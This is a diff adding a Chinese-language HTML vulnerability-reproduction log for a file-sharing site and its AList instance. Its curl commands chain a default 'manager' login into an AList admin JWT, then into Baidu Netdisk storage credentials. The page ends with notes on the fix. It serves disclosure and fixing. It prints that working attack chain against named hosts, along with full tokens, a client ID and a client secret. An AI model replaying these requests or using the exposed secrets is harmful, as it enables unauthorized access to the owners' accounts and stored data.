@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>漏洞复现记录</title><meta name="viewport" content="width=device-width,initial-scale=1"><style>
+body{background:#0d1117;color:#c9d1d9;font:14px/1.5 'Cascadia Code','Fira Code','JetBrains Mono',monospace;padding:20px;max-width:900px;margin:auto}
+pre{white-space:pre-wrap;word-break:break-all;background:#161b22;border:1px solid #30363d;border-radius:6px;padding:16px;margin:8px 0}
+.comment{color:#8b949e;font-style:italic}
+.prompt{color:#58a6ff}
+.token{color:#7ee787}
+.response-ok{color:#3fb950}
+.response-err{color:#f85149}
+.key{color:#d2a8ff}
+.str{color:#a5d6ff}
+.num{color:#79c0ff}
+h2{color:#58a6ff;border-bottom:1px solid #30363d;padding-bottom:8px}
+h3{color:#c9d1d9}
+.sep{border:none;border-top:1px solid #21262d;margin:24px 0}
+.section{margin:16px 0;padding:12px;border-radius:6px}
+.section.critical{background:rgba(248,81,73,0.1);border:1px solid rgba(248,81,73,0.3)}
+.section.info{background:rgba(88,166,255,0.1);border:1px solid rgba(88,166,255,0.3)}
+</style></head><body>
+
+<h2>🔴 漏洞复现：AList 管理 Token 泄露</h2>
+<p class="comment">以下为 ECS 上真实复现的完整对话记录，未做任何修改或过滤。</p>
+
+<hr class="sep">
+
+<h3>步骤 1：用 manager 账号登录</h3>
+<div class="section info">
+<p><span class="prompt">[root@iZ2vcgkv4smamit7qwisvrZ ~]$</span> curl -s https://wlm.cdqzsta.tech/api/login \<br>
+  -X POST \<br>
+  -H "Content-Type: application/json" \<br>
+  -d '{"username":"manager","password":"manager"}'</p>
+<pre>第一次请求（被风控拦截）：
+<span class="response-err">{"error":"您的IP已被风控系统自动封禁，请稍后重试或联系管理员"}</span></pre>
+<pre>第二次请求（仍被封）：
+<span class="response-err">{"error":"您的IP已被风控系统自动封</span></pre>
+<pre>第三次请求（封禁解除，成功）：
+{<span class="key">"token"</span>:<span class="str">"eyJpYXQiOjE3ODQwOTgyOTk5MTcsImV4cCI6MTc4NDEwMTg5OTkxNywidXNlcm5hbWUiOiJtYW5hZ2VyIiwicm9sZSI6Im1hbmFnZXIifQ.602be5284ed4beff85101c6063692cbc106fbdfdde5e61af072473b95e52c6a1"</span>,<span class="key">"role"</span>:<span class="str">"manager"</span>,<span class="key">"username"</span>:<span class="str">"manager"</span>,<span class="key">"permissions"</span>:{<span class="key">"view"</span>:<span class="token">true</span>,<span class="key">"search"</span>:<span class="token">true</span>,<span class="key">"download"</span>:<span class="token">true</span>,<span class="key">"upload"</span>:<span class="token">true</span>,<span class="key">"delete"</span>:<span class="token">true</span>,<span class="key">"rename"</span>:<span class="token">true</span>,<span class="key">"preview"</span>:<span class="token">true</span>,<span class="key">"setting"</span>:<span class="token">true</span>,<span class="key">"controlFile"</span>:<span class="token">true</span>,<span class="key">"basePath"</span>:<span class="str">"/"</span>,<span class="key">"viewStats"</span>:<span class="token">false</span>,<span class="key">"viewActionLogs"</span>:<span class="token">true</span>,<span class="key">"viewIpStats"</span>:<span class="token">false</span>,<span class="key">"viewDownloadLogs"</span>:<span class="token">false</span>,<span class="key">"mgAccess"</span>:<span class="token">false</span>,<span class="key">"mgPermissions"</span>:{<span class="key">"mgUsers"</span>:{<span class="key">"view"</span>:<span class="num">5</span>,<span class="key">"modify"</span>:<span class="num">2</span>},<span class="key">"mgOverview"</span>:{<span class="key">"view"</span>:<span class="num">3</span>,<span class="key">"modify"</span>:<span class="num">3</span>},<span class="key">"mgSettings"</span>:{<span class="key">"view"</span>:<span class="num">5</span>,<span class="key">"modify"</span>:<span class="num">0</span>},<span class="key">"mgDownloads"</span>:{<span class="key">"view"</span>:<span class="num">0</span>,<span class="key">"modify"</span>:<span class="num">3</span>},<span class="key">"mgEmergency"</span>:{<span class="key">"view"</span>:<span class="num">2</span>,<span class="key">"modify"</span>:<span class="num">0</span>},<span class="key">"mgFilePerms"</span>:{<span class="key">"view"</span>:<span class="num">5</span>,<span class="key">"modify"</span>:<span class="num">5</span>}}}</pre>
+</div>
+
+<hr class="sep">
+
+<h3>步骤 2：用 manager token 获取 AList 管理员 JWT</h3>
+<div class="section critical">
+<p><span class="prompt">[root@iZ2vcgkv4smamit7qwisvrZ ~]$</span> curl -s https://wlm.cdqzsta.tech/api/alist-token \<br>
+  -X POST \<br>
+  -H "Authorization: Bearer eyJpYXQiOjE3ODQwOTgzMTIyMTgsImV4cCI6MTc4NDEwMTkxMjIxOCwidXNlcm5hbWUiOiJtYW5hZ2VyIiwicm9sZSI6Im1hbmFnZXIifQ.c9671d57805fd9b755c9826e6372a5053887dba9531cb32032164e9a5ff8ba5f"</p>
+<pre>{<span class="key">"token"</span>:<span class="str">"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicHdkX3RzIjoxNzgwODE0Njc5LCJleHAiOjE3ODQyNzEyMzIsIm5iZiI6MTc4NDA5ODQzMiwiaWF0IjoxNzg0MDk4NDMyfQ.lYrXPxpdE2fZlpOHS8rD-ZATgwmtfgySt6FMV0y0qWU"</span>,<span class="key">"url"</span>:<span class="str">"https://pan.tantantan.tech"</span>}</pre>
+<p class="comment">✅ manager 成功拿到了 AList 管理员 JWT（payload 中 username=admin）</p>
+</div>
+
+<hr class="sep">
+
+<h3>步骤 3：用 AList 管理 token 读取百度网盘存储凭证</h3>
+<div class="section critical">
+<p><span class="prompt">[root@iZ2vcgkv4smamit7qwisvrZ ~]$</span> curl -s "https://pan.tantantan.tech/api/admin/storage/list" \<br>
+  -H "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicHdkX3RzIjoxNzgwODE0Njc5LCJleHAiOjE3ODQyNzEyMzIsIm5iZiI6MTc4NDA5ODQzMiwiaWF0IjoxNzg0MDk4NDMyfQ.lYrXPxpdE2fZlpOHS8rD-ZATgwmtfgySt6FMV0y0qWU"</p>
+<pre>{<span class="key">"code"</span>:<span class="num">200</span>,<span class="key">"message"</span>:<span class="str">"success"</span>,<span class="key">"data"</span>:{<span class="key">"content"</span>:[{<span class="key">"id"</span>:<span class="num">1</span>,<span class="key">"mount_path"</span>:<span class="str">"/sta"</span>,<span class="key">"driver"</span>:<span class="str">"BaiduNetdisk"</span>,<span class="key">"status"</span>:<span class="str">"work"</span>,<span class="key">"addition"</span>:<span class="str">"{<span class="key">"refresh_token"</span>:<span class="str">"122.ab1fab072e90d0f94debc2d2ae31af6d.YDfDBucrc20yHk30vpLcoMUMJyOcGb_1II73hjT.YzaOHQ"</span>,<span class="key">"root_folder_path"</span>:<span class="str">"/"</span>,<span class="key">"order_by"</span>:<span class="str">"name"</span>,<span class="key">"order_direction"</span>:<span class="str">"asc"</span>,<span class="key">"download_api"</span>:<span class="str">"official"</span>,<span class="key">"client_id"</span>:<span class="str">"hq9yQ9w9kR4YHj1kyYafLygVocobh7Sf"</span>,<span class="key">"client_secret"</span>:<span class="str">"YH2VpZcFJHYNnV6vLfHQXDBhcE7ZChyE"</span>,<span class="key">"custom_crack_ua"</span>:<span class="str">"pan.baidu.com"</span>,<span class="key">"AccessToken"</span>:<span class="str">"121.06eccbe423169c6203f0a10d4ed4b732.YCpzNxCTmmi0eisKFibnmITTAmr960qrZZXwXXx.JDgy3A"</span>}"</span>}]}}</pre>
+<p class="comment">✅ 成功获取百度网盘 refresh_token、access_token、client_id、client_secret</p>
+</div>
+
+<hr class="sep">
+
+<h3>验证：JWT 签名验证是否正常</h3>
+<div class="section">
+<p><span class="prompt">[root@iZ2vcgkv4smamit7qwisvrZ ~]$</span> curl -s https://wlm.cdqzsta.tech/api/check-risk \<br>
+  -H "Authorization: Bearer eyJpYXQiOjE3ODQwOTMyOTM0ODUsImV4cCI6MTc4NDA5Njg5MzQ4NSwidXNlcm5hbWUiOiJtYW5hZ2VyIiwicm9sZSI6Im1hbmFnZXIifQ.0000000000000000000000000000000000000000000000000000000000000000"</p>
+<pre>{<span class="key">"ipScore"</span>:<span class="num">0</span>,<span class="key">"dcScore"</span>:<span class="num">0</span>,<span class="key">"lastReason"</span>:<span class="str">""</span>,<span class="key">"warning"</span>:<span class="token">null</span>}</pre>
+<p class="comment">❌ 这个接口无需鉴权，传什么 token 都返回数据，不是签名验证有问题</p>
+</div>
+
+<hr class="sep">
+
+<h2>🔧 修复</h2>
+<p>漏洞 1（AList Token）：已修复，commit <code>e255e06</code>，</f><f>部署后 manager 调 alist-token 返回 403。</p>
+<p>漏洞 3（viewer.html URL）：已修复，同上 commit。</p>
+<p>漏洞 2（默认密钥）：需确认 <code>ADMIN_TOKEN_SECRET</code> 环境变量是否设置。</p>
+
+</body></html>
